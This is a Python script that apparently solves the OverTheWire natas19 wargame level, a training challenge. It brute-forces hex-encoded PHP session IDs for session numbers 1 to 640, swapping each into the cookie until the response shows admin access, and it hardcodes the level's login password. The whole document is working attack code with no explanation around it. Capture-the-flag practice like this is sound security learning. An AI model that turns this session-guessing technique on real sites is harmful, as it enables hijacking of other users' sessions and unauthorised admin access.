import requests

url='http://natas19.natas.labs.overthewire.org/'
auth=('natas19','4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')

def conv(sid,username):
    return ''.join(hex(ord(c))[2:] for c in str(sid)+'-'+username)

for sid in range(1,641):
    print(f'trying {sid}\r',end='')
    s=requests.Session()
    r=s.post(url,data={'username':'admin','password':'admin','submit':'submit'},auth=auth)
    del s.cookies['PHPSESSID']
    s.cookies['PHPSESSID']=conv(sid,'admin')
    r=s.post(url,data={'username':'admin','password':'admin','submit':'submit'},auth=auth)
    if 'You are an admin' in r.text:
        print(r.text)
